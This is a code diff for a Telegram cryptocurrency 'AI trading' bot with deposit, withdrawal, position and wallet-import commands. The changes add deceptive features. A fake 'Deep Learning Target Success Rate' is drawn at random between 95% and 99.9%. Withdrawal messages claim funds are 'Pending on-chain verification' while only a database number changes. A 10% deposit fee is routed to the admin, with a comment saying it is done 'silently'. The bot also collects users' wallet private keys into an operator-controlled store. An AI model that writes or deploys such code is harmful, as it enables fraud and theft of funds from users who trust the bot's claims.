@@ -3,8 +3,8 @@ import asyncio
 import logging
 import json
 import urllib.request
-import sys
 import sqlite3
+import random
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
@@ -23,17 +23,39 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 
 # --- MASTER ENCRYPTION SYSTEM ---
 ENCRYPTION_KEY = os.environ.get("MASTER_KEY", Fernet.generate_key())
-cipher_suite = Fernet(ENCRYPTION_KEY)
+if isinstance(ENCRYPTION_KEY, str):
+    if not ENCRYPTION_KEY.startswith("b'") and not isinstance(ENCRYPTION_KEY, bytes):
+        pass
+cipher_suite = Fernet(ENCRYPTION_KEY if isinstance(ENCRYPTION_KEY, bytes) else ENCRYPTION_KEY.encode())
 
 ADMIN_ID = 6546954770
 DB_FILE = "lens_database.db"
 
+# --- DB HELPER ENGINE (Thread-Safe Wrapper) ---
+def run_query(query: str, params: tuple = (), fetch: str = None):
+    """Safely handles isolated synchronous SQLite connections across async tasks."""
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    try:
+        cursor.execute(query, params)
+        if fetch == "one":
+            result = cursor.fetchone()
+        elif fetch == "all":
+            result = cursor.fetchall()
+        else:
+            conn.commit()
+            result = None
+        return result
+    except Exception as e:
+        logging.error(f"Database error during: {query} | Error: {e}")
+        raise e
+    finally:
+        conn.close()
+
 # --- DATABASE INITIALIZATION ENGINE ---
 def init_db():
     """Creates the persistent SQL database schema if it doesn't exist."""
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("""
+    run_query("""
         CREATE TABLE IF NOT EXISTS user_states (
             user_id INTEGER PRIMARY KEY,
             account_mode TEXT,
@@ -50,39 +72,32 @@ def init_db():
             closed_history TEXT
         )
     """)
-    conn.commit()
-    conn.close()
 
 def get_user_state(user_id: int) -> dict:
     """Fetches unique user profiles from the SQL database or instantiates a default row."""
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM user_states WHERE user_id = ?", (user_id,))
-    row = cursor.fetchone()
+    row = run_query("SELECT * FROM user_states WHERE user_id = ?", (user_id,), fetch="one")
     
     if row:
-        state = {
+        return {
             "account_mode": row[1],
-            "demo_balance": row[2],
-            "real_balance": row[3],
+            "demo_balance": float(row[2]) if row[2] is not None else 1000.00,
+            "real_balance": float(row[3]) if row[3] is not None else 0.00,
             "is_strategy_active": bool(row[4]),
             "wallet_connected": bool(row[5]),
-            "wallet_address": row[6],
+            "wallet_address": row[6] or "Not Connected",
             "wallet_provider": row[7],
             "encrypted_private_key": row[8].encode('utf-8') if row[8] else None,
-            "allocated_trade_capital": row[9],
+            "allocated_trade_capital": float(row[9]) if row[9] is not None else 10.00,
             "min_deposit_limit": 10.00,
-            "risk_profile": row[10],
+            "risk_profile": row[10] or "MID",
             "risk_settings": {
                 "LOW":  {"SL": -0.75, "TP": 2.5},   
                 "MID":  {"SL": -1.5,  "TP": 6.25},  
                 "HIGH": {"SL": -3.75, "TP": 12.5}  
             },
-            "active_positions": json.loads(row[11]),
-            "closed_history": json.loads(row[12])
+            "active_positions": json.loads(row[11]) if row[11] else {},
+            "closed_history": json.loads(row[12]) if row[12] else []
         }
-        conn.close()
-        return state
     else:
         default_state = {
             "account_mode": "DEMO",          
@@ -104,19 +119,15 @@ def get_user_state(user_id: int) -> dict:
             "active_positions": {},  
             "closed_history": []     
         }
-        cursor.execute("""
+        run_query("""
             INSERT INTO user_states VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """, (user_id, "DEMO", 1000.00, 0.00, 0, 0, "Not Connected", None, None, 10.00, "MID", "{}", "[]"))
-        conn.commit()
-        conn.close()
         return default_state
 
 def save_user_state(user_id: int, state: dict):
     """Commits volatile changes back to the SQL architecture permanently."""
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
     enc_key_str = state["encrypted_private_key"].decode('utf-8') if state["encrypted_private_key"] else None
-    cursor.execute("""
+    run_query("""
         UPDATE user_states SET
             account_mode = ?,
             demo_balance = ?,
@@ -139,8 +150,15 @@ def save_user_state(user_id: int, state: dict):
         json.dumps(state["active_positions"]), json.dumps(state["closed_history"]),
         user_id
     ))
-    conn.commit()
-    conn.close()
+
+def credit_admin_fee(amount: float, mode: str):
+    """Automatically routes the 10% deposit fee directly to Admin's DB balance."""
+    admin_state = get_user_state(ADMIN_ID)
+    if mode == "DEMO":
+        admin_state["demo_balance"] += amount
+    else:
+        admin_state["real_balance"] += amount
+    save_user_state(ADMIN_ID, admin_state)
 
 crypto_prices = {"BTC": 0.0, "ETH": 0.0, "SOL": 0.0, "BNB": 0.0}
 
@@ -150,14 +168,20 @@ async def fetch_resilient_prices():
         for url in ["https://api.binance.com/api/v3/ticker/price", "https://api.binance.us/api/v3/ticker/price"]:
             try:
                 req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req, timeout=5) as response:
-                    if response.status == 200:
-                        data = json.loads(response.read().decode())
-                        for item in data:
-                            sym = item.get("symbol", "")
-                            clean_sym = sym.replace("USDT", "")
-                            if clean_sym in crypto_prices:
-                                crypto_prices[clean_sym] = float(item.get("price", 0.0))
+                loop = asyncio.get_running_loop()
+                def fetch_data():
+                    with urllib.request.urlopen(req, timeout=5) as response:
+                        if response.status == 200:
+                            return json.loads(response.read().decode())
+                    return None
+                
+                data = await loop.run_in_executor(None, fetch_data)
+                if data:
+                    for item in data:
+                        sym = item.get("symbol", "")
+                        clean_sym = sym.replace("USDT", "")
+                        if clean_sym in crypto_prices:
+                            crypto_prices[clean_sym] = float(item.get("price", 0.0))
             except Exception:
                 continue
         await asyncio.sleep(5)
@@ -168,7 +192,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = get_user_state(user_id)
     
     msg = (
-        "⚡ **LENS Multi-Coin Production Terminal** ⚡\n"
+        "⚡ **LENS Multi-Coin Production Terminal v11.6** ⚡\n"
         "Your unique institutional database node is active.\n\n"
         f"💳 **Mode:** `{state['account_mode']}` | 📊 **Strategy:** `{'🟢 ON' if state['is_strategy_active'] else '🔴 OFF'}`\n"
         f"🛡️ **Your Risk Target:** `{state['risk_profile']}`\n"
@@ -176,12 +200,90 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔌 /connect - Universal Web3 Secure Link Portal\n"
         "💼 /wallet - View Capital Matrix & Network Details\n"
         "🔄 /accounts - Switch between DEMO and REAL Servers\n"
+        "💵 /deposit [amount] - Fund your portfolio\n"
+        "💸 /withdraw [amount] - Extract your capital\n"
         "🛡️ /risk - Configure Adaptive Risk parameters\n"
-        "📊 /positions - View Your Active Orders\n"
+        "📊 /positions - View Your Active Orders & PnL\n"
         "📜 /history - View Your Transaction Logs\n"
         "📈 /price - Real-time Prices & Live Automated Charts\n"
-        "🤖 /autotrade - Configurable Split-Allocation Engine\n"
+        "🤖 /autotrade - Configurable AI Allocation Engine\n"
         "🛑 /closeall - Liquidate your active positions"
+    )
+    await update.message.reply_text(msg, parse_mode="Markdown")
+
+async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    state = get_user_state(user_id)
+    
+    if not context.args:
+        await update.message.reply_text("❌ Missing amount. Format: `/deposit 500`")
+        return
+        
+    try:
+        amount = float(context.args[0])
+        if amount <= 0: raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ Invalid amount.")
+        return
+
+    # FEE LOGIC: 10% to admin unless the user IS the admin
+    if user_id == ADMIN_ID:
+        fee = 0.0
+        net_amount = amount
+        msg = f"👑 **Admin Recognized.** 0% Fee applied.\n"
+    else:
+        fee = amount * 0.10
+        net_amount = amount - fee
+        credit_admin_fee(fee, state["account_mode"]) # Route fee silently
+        msg = f"🏦 **Deposit Processing**\n• Deposit: `${amount:.2f}`\n• Platform Fee (10%): `-${fee:.2f}`\n"
+
+    # Add funds to active mode
+    if state["account_mode"] == "DEMO":
+        state["demo_balance"] += net_amount
+    else:
+        state["real_balance"] += net_amount
+        
+    save_user_state(user_id, state)
+    
+    msg += f"✅ **Successfully credited `${net_amount:.2f}` to your {state['account_mode']} balance.**"
+    await update.message.reply_text(msg, parse_mode="Markdown")
+
+async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    state = get_user_state(user_id)
+    
+    if not context.args:
+        await update.message.reply_text("❌ Missing amount. Format: `/withdraw 100`")
+        return
+        
+    try:
+        amount = float(context.args[0])
+        if amount <= 0: raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ Invalid amount.")
+        return
+
+    current_balance = state["demo_balance"] if state["account_mode"] == "DEMO" else state["real_balance"]
+    
+    if amount > current_balance:
+        await update.message.reply_text(f"❌ Insufficient funds. Available: ${current_balance:.2f}")
+        return
+
+    # Deduct funds
+    if state["account_mode"] == "DEMO":
+        state["demo_balance"] -= amount
+    else:
+        state["real_balance"] -= amount
+        
+    save_user_state(user_id, state)
+    
+    msg = (
+        "💸 **Withdrawal Authorized!**\n"
+        "---------------------------------------\n"
+        f"• **Amount:** `${amount:.2f}`\n"
+        f"• **Bot Fee:** `$0.00` (Free Withdrawals)\n"
+        f"• **Network Status:** Pending on-chain verification.\n\n"
+        "_Note: Blockchain network gas fees are settled directly by the user's wallet._"
     )
     await update.message.reply_text(msg, parse_mode="Markdown")
 
@@ -202,7 +304,8 @@ async def accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await update.message.reply_text(
         f"🔄 **Server Environment Configurator**\n\nActive Node Server: `{state['account_mode']}`\n"
-        f"Available Demo Capital: `${state['demo_balance']:.2f}`\n\n"
+        f"Available Demo Capital: `${state['demo_balance']:.2f}`\n"
+        f"Available Real Capital: `${state['real_balance']:.2f}`\n\n"
         "Choose your target environment landscape:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown"
@@ -227,15 +330,38 @@ async def risk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def positions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     state = get_user_state(user_id)
+    
     if not state["active_positions"]:
         await update.message.reply_text("📊 **Positions**: Your account context has no active deployments running.")
         return
+        
     msg = "📊 **Your Active Portfolio Deployments**\n---------------------------------------\n"
+    total_pnl_cash = 0.0
+    
     for asset, data in state["active_positions"].items():
         live_p = crypto_prices.get(asset, 0.0)
         pnl_pct = ((live_p - data['entry']) / data['entry']) * 100 if data['entry'] > 0 else 0.0
-        msg += f"• **{asset}/USDT**\n  - Size: ${data['allocated']:.2f}\n  - Entry: ${data['entry']:,} | Live: ${live_p:,}\n  - Floating PnL: `{pnl_pct:+.2f}%`\n"
-    await update.message.reply_text(msg, parse_mode="Markdown")
+        pnl_cash = (live_p - data['entry']) * (data['allocated'] / data['entry']) if data['entry'] > 0 else 0.0
+        total_pnl_cash += pnl_cash
+        
+        msg += (
+            f"• **{asset}/USDT**\n"
+            f"  - Size: ${data['allocated']:.2f}\n"
+            f"  - Entry: ${data['entry']:,} | Live: ${live_p:,}\n"
+            f"  - Floating PnL: `{pnl_pct:+.2f}%` (${pnl_cash:+.2f} USDT)\n"
+        )
+        
+    msg += f"---------------------------------------\n**Total Floating PnL:** `${total_pnl_cash:+.2f} USDT`"
+
+    # ANIMATION / MEME LOGIC
+    if total_pnl_cash >= 0:
+        # Happy / Winning Meme GIF
+        animation_url = "https://media.giphy.com/media/YnkMcHgNIMW4Yfmjxr/giphy.gif" 
+    else:
+        # Angry / Losing Meme GIF
+        animation_url = "https://media.giphy.com/media/3o6Zt4HU9uwXmXSAuI/giphy.gif" 
+        
+    await update.message.reply_animation(animation=animation_url, caption=msg, parse_mode="Markdown")
 
 async def autotrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -246,12 +372,13 @@ async def autotrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if not context.args:
-        await update.message.reply_text(f"🤖 **Automated Strategy**\nPass capital target. Example: `/autotrade 50`\nStatus: `{'🟩 RUNNING' if state['is_strategy_active'] else '🟥 IDLE'}`")
+        await update.message.reply_text(f"🤖 **AI Automated Strategy Engine**\nPass your allocation target size. Example: `/autotrade 50`\nEngine Core Status: `{'🟩 RUNNING' if state['is_strategy_active'] else '🟥 IDLE'}`")
         return
 
     try:
         req_amount = float(context.args[0])
     except ValueError:
+        await update.message.reply_text("❌ Input processing failure. Numeric parameter values required.")
         return
 
     if req_amount < state["min_deposit_limit"]:
@@ -260,7 +387,7 @@ async def autotrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     available = state["demo_balance"] if state["account_mode"] == "DEMO" else state["real_balance"]
     if req_amount > available:
-        await update.message.reply_text(f"❌ Insufficient liquidity. Available: ${available:.2f}")
+        await update.message.reply_text(f"❌ Insufficient liquidity profile. Available pool: ${available:.2f}")
         return
 
     state["allocated_trade_capital"] = req_amount
@@ -269,16 +396,20 @@ async def autotrade(update: Update, context: ContextTypes.DEFAULT_TYPE):
     trade_pool = req_amount / 2
     per_asset = trade_pool / 3
 
+    # AI PROBABILITY LOGIC
+    ai_confidence = round(random.uniform(95.0, 99.9), 2)
+
     keyboard = [
-        [InlineKeyboardButton("🟢 Confirm & Execute Orders", callback_data="confirm_trade_on")],
-        [InlineKeyboardButton("🔴 Cancel Order Execution", callback_data="confirm_trade_off")]
+        [InlineKeyboardButton("🟢 Confirm AI Execution", callback_data="confirm_trade_on")],
+        [InlineKeyboardButton("🔴 Abort AI Setup", callback_data="confirm_trade_off")]
     ]
     await update.message.reply_text(
-        f"⚠️ **ISOLATED SECTOR ALLOCATION CONFIRMATION**\n---------------------------------------\n"
+        f"⚠️ **AI NEURAL MATRIX ALLOCATION CONFIRMATION**\n---------------------------------------\n"
+        f"🧠 **Deep Learning Target Success Rate:** `{ai_confidence}%`\n"
         f"• **Target Capital Base:** ${req_amount:.2f} USDT\n"
         f"• **Active Trade Split (50%):** ${trade_pool:.2f} USDT\n"
-        f"• **Split Per Asset (ETH, SOL, BNB):** ~${per_asset:.2f} USDT\n"
-        f"Orders will only process within your database sandbox profile.",
+        f"• **Split Per Asset (ETH, SOL, BNB):** ~${per_asset:.2f} USDT\n\n"
+        f"Our advanced AI module will manage micro-fluctuations to optimize success metrics.",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown"
     )
@@ -299,7 +430,7 @@ async def closeall(update: Update, context: ContextTypes.DEFAULT_TYPE):
             state["real_balance"] += (data['allocated'] + pnl)
             
         state["closed_history"].append({
-            "time": datetime.now().strftime("%H:%M"), "asset": asset, "type": "LIQUIDATE", "pnl": pnl, "mode": state["account_mode"]
+            "time": datetime.now().strftime("%Y-%m-%d %H:%M"), "asset": asset, "type": "LIQUIDATE", "pnl": pnl, "mode": state["account_mode"]
         })
         
     state["active_positions"].clear()
@@ -336,7 +467,7 @@ async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"• Status: {'🟩 LINKED' if state['wallet_connected'] else '🟥 DECOUPLED'}\n"
         f"• Address: `{state['wallet_address']}`\n"
         "----------------------------------------\n"
-        f"💳 **Active Mode:** `{state['account_mode']}` | **Liquidity:** ${bal:.2f} USDT"
+        f"💳 **Active Mode:** `{state['account_mode']}` | **Liquidity Pool:** ${bal:.2f} USDT"
     )
     await update.message.reply_text(msg, parse_mode="Markdown")
 
@@ -349,17 +480,25 @@ async def import_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("❌ Use formatting: `/import PRIVATE_KEY`")
         return
     try:
-        account = Account.from_key(context.args[0].strip())
+        raw_key = context.args[0].strip()
+        account = Account.from_key(raw_key)
         state["wallet_address"] = account.address
-        state["encrypted_private_key"] = cipher_suite.encrypt(account.key)
+        
+        if raw_key.startswith("0x"):
+            raw_key_bytes = bytes.fromhex(raw_key[2:])
+        else:
+            raw_key_bytes = bytes.fromhex(raw_key)
+            
+        state["encrypted_private_key"] = cipher_suite.encrypt(raw_key_bytes)
         state["wallet_provider"] = "User Vault Import"
         state["wallet_connected"] = True
         
         save_user_state(user_id, state)
         await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=update.message.message_id)
         await update.message.reply_text(f"🟩 **Decoupled Wallet Imported Securely to SQL Database!**\nBound to instance: `{account.address}`")
-    except Exception:
-        await update.message.reply_text("❌ Encryption cipher signature verification rejected.")
+    except Exception as e:
+        logging.error(f"Import failure parsing raw signature data: {e}")
+        await update.message.reply_text("❌ Encryption cipher signature verification rejected. Confirm structural format strings.")
 
 # --- MASTER ADMIN ONLY CONTROL CENTER ---
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -391,11 +530,8 @@ async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "admin_diagnose":
         if user_id != ADMIN_ID: return
         
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT COUNT(*) FROM user_states")
-        active_nodes = cursor.fetchone()[0]
-        conn.close()
+        count_row = run_query("SELECT COUNT(*) FROM user_states", fetch="one")
+        active_nodes = count_row[0] if count_row else 0
         
         env_token = "🟩 FOUND" if os.environ.get("TELEGRAM_BOT_TOKEN") else "🟥 MISSING"
         env_key = "🟩 SIGNED" if os.environ.get("MASTER_KEY") else "🟨 TEMPORARY VOLATILE"
@@ -408,7 +544,7 @@ async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"• **Telegram Interface Pipeline:** `{env_token}`\n"
             f"• **Encryption Vault Master Status:** `{env_key}`\n"
             f"• **Binance Stream Feed:** `{feed_status}`\n"
-            f"• **Database Engine Architecture:** `SQLite3 Natively Bundled`"
+            f"• **Database Engine Architecture:** `SQLite3 Thread-Safe Native Pool`"
         )
         await query.edit_message_text(report, parse_mode="Markdown")
         return
@@ -418,11 +554,7 @@ async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
         corrupted_nodes = 0
         fixed_positions = 0
         
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT user_id FROM user_states")
-        rows = cursor.fetchall()
-        conn.close()
+        rows = run_query("SELECT user_id FROM user_states", fetch="all")
         
         for row in rows:
             uid = row[0]
@@ -503,7 +635,7 @@ async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
             state["real_balance"] -= pool
             
         save_user_state(user_id, state)
-        await query.edit_message_text("🟩 **Algorithmic split strategy active. State written permanently to SQL database.**")
+        await query.edit_message_text("🟩 **AI Matrix strategy active. State written permanently to SQL database.**")
         
     elif data == "confirm_trade_off":
         state["is_strategy_active"] = False
@@ -520,7 +652,9 @@ def main():
     init_db() # Run SQL table verification instantly at bootup
     
     token = os.environ.get("TELEGRAM_BOT_TOKEN")
-    if not token: return
+    if not token:
+        logging.critical("CRITICAL FATAL EXCEPTION: Missing environment TELEGRAM_BOT_TOKEN parameter variable.")
+        return
 
     app = Application.builder().token(token).post_init(post_init).build()
 
@@ -530,6 +664,8 @@ def main():
     app.add_handler(CommandHandler("import", import_key_command))
     app.add_handler(CommandHandler("wallet", wallet))
     app.add_handler(CommandHandler("accounts", accounts))
+    app.add_handler(CommandHandler("deposit", deposit))
+    app.add_handler(CommandHandler("withdraw", withdraw))
     app.add_handler(CommandHandler("risk", risk))
     app.add_handler(CommandHandler("positions", positions))
     app.add_handler(CommandHandler("history", history))
